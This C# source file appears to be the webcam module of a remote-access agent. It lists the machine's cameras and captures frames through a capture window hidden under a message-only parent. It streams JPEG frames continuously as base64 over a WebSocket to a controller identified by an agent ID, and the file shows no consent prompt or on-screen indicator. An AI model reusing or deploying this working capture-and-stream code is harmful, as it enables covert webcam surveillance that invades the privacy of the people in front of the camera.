using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Text;
using LibraNextgen.Agent.Communication;

namespace LibraNextgen.Agent.Modules.Execution;

public sealed class CameraCapture : IDisposable
{
    private readonly WsCommunicator _ws;
    private readonly string _agentId;

    private int _fps = 10;
    private int _cameraIndex;
    private const int JpegQuality = 60;

    private CancellationTokenSource? _cts;
    private Thread? _pumpThread;
    private IntPtr _capWnd;
    private CapVideoStreamCallback? _frameCallback;
    private IntPtr _frameCallbackPtr;
    private byte[] _latestFrame = Array.Empty<byte>();
    private readonly object _frameLock = new();
    private static ImageCodecInfo? _jpegCodec;

    // ── SetupAPI P/Invoke ──────────────────────────────────────────────────
    private static readonly Guid KSCATEGORY_VIDEO_CAMERA = new(0xCA3E7AB9, 0xB4C3, 0x4AE6, 0x82, 0x51, 0x57, 0x9E, 0xF9, 0x33, 0x89, 0x0F);

    private const uint DIGCF_PRESENT = 0x02;
    private const uint DIGCF_DEVICEINTERFACE = 0x10;
    private const uint SPDRP_DEVICEDESC = 0x00;
    private const uint SPDRP_FRIENDLYNAME = 0x0C;

    [DllImport("setupapi.dll", SetLastError = true)]
    private static extern IntPtr SetupDiGetClassDevs(ref Guid ClassGuid, string? Enumerator, IntPtr hwndParent, uint Flags);

    [DllImport("setupapi.dll", SetLastError = true)]
    private static extern bool SetupDiEnumDeviceInfo(IntPtr DeviceInfoSet, uint MemberIndex, ref SP_DEVINFO_DATA DeviceInfoData);

    [DllImport("setupapi.dll", SetLastError = true)]
    private static extern bool SetupDiGetDeviceRegistryProperty(IntPtr DeviceInfoSet, ref SP_DEVINFO_DATA DeviceInfoData,
        uint Property, out uint PropertyRegDataType, byte[]? PropertyBuffer, uint PropertyBufferSize, out uint RequiredSize);

    [DllImport("setupapi.dll", SetLastError = true)]
    private static extern bool SetupDiDestroyDeviceInfoList(IntPtr DeviceInfoSet);

    [StructLayout(LayoutKind.Sequential)]
    private struct SP_DEVINFO_DATA
    {
        public uint cbSize;
        public Guid ClassGuid;
        public uint DevInst;
        public IntPtr Reserved;
    }

    // ── VFW P/Invoke ───────────────────────────────────────────────────────

    [DllImport("avicap32.dll", CharSet = CharSet.Unicode)]
    private static extern IntPtr capCreateCaptureWindowW(string lpszWindowName, uint dwStyle,
        int x, int y, int nWidth, int nHeight, IntPtr hwndParent, int nID);

    [DllImport("avicap32.dll")]
    private static extern bool capDriverConnect(IntPtr hwnd, int iIndex);

    [DllImport("avicap32.dll")]
    private static extern bool capDriverDisconnect(IntPtr hwnd);

    [DllImport("avicap32.dll")]
    private static extern bool capSetCallbackOnFrame(IntPtr hwnd, IntPtr callback);

    [DllImport("avicap32.dll")]
    private static extern bool capGrabFrame(IntPtr hwnd);

    [DllImport("avicap32.dll")]
    private static extern bool capSetCallbackOnError(IntPtr hwnd, IntPtr callback);

    [DllImport("avicap32.dll")]
    private static extern bool capGetStatus(IntPtr hwnd, ref CAPSTATUS status, int size);

    [DllImport("avicap32.dll", CharSet = CharSet.Unicode)]
    private static extern bool capDriverGetName(IntPtr hwnd, StringBuilder name, int nameSize);

    [DllImport("avicap32.dll")]
    private static extern int capGetVideoFormat(IntPtr hwnd, IntPtr format, int size);

    [DllImport("avicap32.dll")]
    private static extern int capSetVideoFormat(IntPtr hwnd, IntPtr format, int size);

    [DllImport("user32.dll")]
    private static extern int GetMessage(out MSG msg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax);

    [DllImport("user32.dll")]
    private static extern bool TranslateMessage(ref MSG msg);

    [DllImport("user32.dll")]
    private static extern int DispatchMessage(ref MSG msg);

    [DllImport("user32.dll")]
    private static extern IntPtr DefWindowProc(IntPtr hWnd, uint msg, IntPtr wParam, IntPtr lParam);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr CreateWindowEx(uint dwExStyle, string lpClassName, string lpWindowName,
        uint dwStyle, int x, int y, int nWidth, int nHeight, IntPtr hWndParent, IntPtr hMenu,
        IntPtr hInstance, IntPtr lpParam);

    [DllImport("user32.dll")]
    private static extern bool DestroyWindow(IntPtr hWnd);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string? lpModuleName);

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate IntPtr CapVideoStreamCallback(IntPtr hWnd, IntPtr lpVHdr);

    [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
    private delegate IntPtr CapErrorCallback(IntPtr hWnd, int nID, string lpsz);

    [StructLayout(LayoutKind.Sequential)]
    private struct MSG
    {
        public IntPtr hwnd;
        public uint message;
        public IntPtr wParam;
        public IntPtr lParam;
        public uint time;
        public POINT pt;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct POINT { public int x, y; }

    [StructLayout(LayoutKind.Sequential)]
    private struct CAPSTATUS
    {
        public uint uiImageWidth;
        public uint uiImageHeight;
        public int fLiveWindow;
        public int fOverlayWindow;
        public int fScale;
        public POINT ptScroll;
        public int fUsingDefaultPalette;
        public int fAudioHardware;
        public int fCapFileExists;
        public uint dwCurrentVideoFrame;
        public uint dwCurrentVideoFramesDropped;
        public uint dwCurrentWaveSamples;
        public uint dwCurrentTimeElapsedMS;
        public IntPtr hPalCurrent;
        public int fCapturingNow;
        public uint dwReturn;
        public uint wNumVideoAllocated;
        public uint wNumAudioAllocated;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct VIDEOHDR
    {
        public IntPtr lpData;
        public int dwBufferLength;
        public int dwBytesUsed;
        public int dwTimeCaptured;
        public IntPtr dwUser;
        public int dwFlags;
        public IntPtr dwReserved0;
        public IntPtr dwReserved1;
        public IntPtr dwReserved2;
        public IntPtr dwReserved3;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 2)]
    private struct BITMAPINFOHEADER
    {
        public uint biSize;
        public int biWidth;
        public int biHeight;
        public ushort biPlanes;
        public ushort biBitCount;
        public uint biCompression;
        public uint biSizeImage;
        public int biXPelsPerMeter;
        public int biYPelsPerMeter;
        public uint biClrUsed;
        public uint biClrImportant;
    }

    private const uint WS_CHILD = 0x40000000;
    private const uint WS_VISIBLE = 0x10000000;
    private const uint WS_CAPTION = 0x00C00000;
    private const uint WM_USER = 0x0400;
    private const uint WM_CLOSE = 0x0010;

    // ── Public API ─────────────────────────────────────────────────────────

    public static string GetDevicesJson()
    {
        try
        {
            var list = new List<string>();
            var guid = KSCATEGORY_VIDEO_CAMERA;
            var hDevInfo = SetupDiGetClassDevs(ref guid, null, IntPtr.Zero, DIGCF_PRESENT | DIGCF_DEVICEINTERFACE);

            if (hDevInfo == IntPtr.Zero || hDevInfo == new IntPtr(-1))
                return "[]";

            try
            {
                uint idx = 0;
                var devData = new SP_DEVINFO_DATA { cbSize = (uint)Marshal.SizeOf<SP_DEVINFO_DATA>() };

                while (SetupDiEnumDeviceInfo(hDevInfo, idx++, ref devData))
                {
                    var name = GetDeviceName(hDevInfo, ref devData);
                    if (!string.IsNullOrEmpty(name))
                    {
                        list.Add($"{{\"index\":{list.Count},\"name\":\"{EscapeJson(name)}\",\"characteristics\":[]}}");
                    }
                    devData = new SP_DEVINFO_DATA { cbSize = (uint)Marshal.SizeOf<SP_DEVINFO_DATA>() };
                }
            }
            finally
            {
                SetupDiDestroyDeviceInfoList(hDevInfo);
            }

            Console.WriteLine($"[Camera] Found {list.Count} camera(s) via SetupAPI");
            return $"[{string.Join(",", list)}]";
        }
        catch (Exception ex)
        {
            Console.WriteLine($"[Camera] SetupAPI enumeration failed: {ex.Message}");
            return "[]";
        }
    }

    private static string GetDeviceName(IntPtr hDevInfo, ref SP_DEVINFO_DATA devData)
    {
        // Try friendly name first, fall back to device description
        foreach (var prop in new[] { SPDRP_FRIENDLYNAME, SPDRP_DEVICEDESC })
        {
            if (!SetupDiGetDeviceRegistryProperty(hDevInfo, ref devData, prop,
                    out _, null, 0, out var requiredSize) && requiredSize == 0)
                continue;

            var buf = new byte[requiredSize];
            if (SetupDiGetDeviceRegistryProperty(hDevInfo, ref devData, prop,
                    out _, buf, (uint)buf.Length, out _))
            {
                return Encoding.Unicode.GetString(buf).TrimEnd('\0');
            }
        }
        return string.Empty;
    }

    private static string EscapeJson(string s) => s.Replace("\\", "\\\\").Replace("\"", "\\\"");

    // ── Constructor / Lifecycle ────────────────────────────────────────────

    public CameraCapture(WsCommunicator ws, string agentId)
    {
        _ws = ws;
        _agentId = agentId;
    }

    public void Start(int fps, int cameraIndex)
    {
        Stop();
        _fps = Math.Clamp(fps, 1, 30);
        _cameraIndex = cameraIndex;
        _cts = new CancellationTokenSource();
        _ = Task.Run(() => StartCapture(_cts.Token));
    }

    public void Stop()
    {
        _cts?.Cancel();

        if (_capWnd != IntPtr.Zero)
        {
            capSetCallbackOnFrame(_capWnd, IntPtr.Zero);
            capSetCallbackOnError(_capWnd, IntPtr.Zero);
            capDriverDisconnect(_capWnd);
            DestroyWindow(_capWnd);
            _capWnd = IntPtr.Zero;
        }

        _pumpThread?.Join(2000);

        _cts?.Dispose();
        _cts = null;
    }

    public void SetFps(int fps) => _fps = Math.Clamp(fps, 1, 30);

    public void Dispose() => Stop();

    // ── Capture Implementation ─────────────────────────────────────────────

    private void StartCapture(CancellationToken ct)
    {
        try
        {
            // Create message-only window as parent
            var hInstance = GetModuleHandle(null);
            var parent = CreateWindowEx(0, "STATIC", "CameraParent", 0,
                0, 0, 0, 0, new IntPtr(-3), IntPtr.Zero, hInstance, IntPtr.Zero);

            if (parent == IntPtr.Zero)
            {
                ReportError("Failed to create message window");
                return;
            }

            // Create VFW capture window
            _capWnd = capCreateCaptureWindowW("CameraCap", WS_CHILD | WS_VISIBLE,
                0, 0, 640, 480, parent, 0);

            if (_capWnd == IntPtr.Zero)
            {
                DestroyWindow(parent);
                ReportError("Failed to create capture window (no webcam driver?)");
                return;
            }

            // Connect to camera
            if (!capDriverConnect(_capWnd, _cameraIndex))
            {
                DestroyWindow(_capWnd);
                DestroyWindow(parent);
                ReportError($"Cannot connect to camera {_cameraIndex}");
                return;
            }

            var status = new CAPSTATUS();
            capGetStatus(_capWnd, ref status, Marshal.SizeOf<CAPSTATUS>());
            Console.WriteLine($"[Camera] Connected: {status.uiImageWidth}x{status.uiImageHeight}");

            // Set frame callback
            _frameCallback = OnFrameCallback;
            _frameCallbackPtr = Marshal.GetFunctionPointerForDelegate(_frameCallback);
            capSetCallbackOnFrame(_capWnd, _frameCallbackPtr);

            // Start message pump on this thread
            _ = Task.Run(() => CaptureLoop(ct), ct);
            MessagePump(ct);

            // Cleanup
            capSetCallbackOnFrame(_capWnd, IntPtr.Zero);
            capDriverDisconnect(_capWnd);
            DestroyWindow(_capWnd);
            DestroyWindow(parent);
            _capWnd = IntPtr.Zero;
        }
        catch (Exception ex)
        {
            ReportError(ex.Message);
        }
    }

    private void MessagePump(CancellationToken ct)
    {
        _pumpThread = Thread.CurrentThread;
        while (!ct.IsCancellationRequested)
        {
            if (GetMessage(out var msg, IntPtr.Zero, 0, 0) <= 0)
                break;
            TranslateMessage(ref msg);
            DispatchMessage(ref msg);
        }
        _pumpThread = null;
    }

    private async Task CaptureLoop(CancellationToken ct)
    {
        var interval = 1000 / _fps;
        try
        {
            while (!ct.IsCancellationRequested)
            {
                await Task.Delay(interval, ct);
                if (_capWnd != IntPtr.Zero)
                    capGrabFrame(_capWnd);
            }
        }
        catch (OperationCanceledException) { }
    }

    private IntPtr OnFrameCallback(IntPtr hWnd, IntPtr lpVHdr)
    {
        if (_cts?.IsCancellationRequested == true) return IntPtr.Zero;

        try
        {
            var vh = Marshal.PtrToStructure<VIDEOHDR>(lpVHdr);
            if (vh.lpData == IntPtr.Zero || vh.dwBytesUsed == 0) return IntPtr.Zero;

            var bmi = Marshal.PtrToStructure<BITMAPINFOHEADER>(vh.lpData);
            int pixelOffset = (int)bmi.biSize;
            int bytesPerPixel = bmi.biBitCount / 8;
            int stride = ((bmi.biWidth * (int)bmi.biBitCount + 31) / 32) * 4;
            int bmpSize = stride * Math.Abs(bmi.biHeight);

            if (pixelOffset + bmpSize > vh.dwBytesUsed) return IntPtr.Zero;

            var pixelData = new byte[bmpSize];
            Marshal.Copy(vh.lpData + pixelOffset, pixelData, 0, bmpSize);

            var jpeg = BgrToJpeg(pixelData, bmi.biWidth, Math.Abs(bmi.biHeight), stride);

            lock (_frameLock) { _latestFrame = jpeg; }

            // Fire-and-forget send
            _ = _ws.SendResultRawAsync("camera.frame", _agentId,
                $$"""{"data":"{{Convert.ToBase64String(jpeg)}}"}""");
        }
        catch { /* drop frame */ }
        return IntPtr.Zero;
    }

    private static byte[] BgrToJpeg(byte[] pixelData, int width, int height, int stride)
    {
        using var bmp = new Bitmap(width, height, PixelFormat.Format24bppRgb);

        var rect = new Rectangle(0, 0, width, height);
        var bmpData = bmp.LockBits(rect, ImageLockMode.WriteOnly, PixelFormat.Format24bppRgb);

        // Copy with stride conversion (bottom-up DIB to top-down Bitmap)
        var bmpStride = bmpData.Stride;
        // Flip vertically: DIB is bottom-up
        for (int y = 0; y < height; y++)
        {
            var srcRow = pixelData.AsSpan((height - 1 - y) * stride, Math.Min(stride, bmpStride));
            var dstRow = bmpData.Scan0 + y * bmpStride;
            Marshal.Copy(srcRow.ToArray(), 0, dstRow, Math.Min(srcRow.Length, bmpStride));
        }

        bmp.UnlockBits(bmpData);

        using var ms = new MemoryStream();
        var codec = GetJpegEncoder();
        var encParams = new EncoderParameters(1);
        encParams.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, JpegQuality);
        bmp.Save(ms, codec, encParams);
        return ms.ToArray();
    }

    private void ReportError(string msg)
    {
        Console.WriteLine($"[Camera] Error: {msg}");
        _ = _ws.SendResultRawAsync("camera.error", _agentId, $$"""{"error":"{{EscapeJson(msg)}}"}""");
    }

    private static ImageCodecInfo GetJpegEncoder()
    {
        if (_jpegCodec != null) return _jpegCodec;
        foreach (var codec in ImageCodecInfo.GetImageEncoders())
        {
            if (codec.MimeType == "image/jpeg")
            {
                _jpegCodec = codec;
                return codec;
            }
        }
        throw new InvalidOperationException("JPEG encoder not found");
    }
}
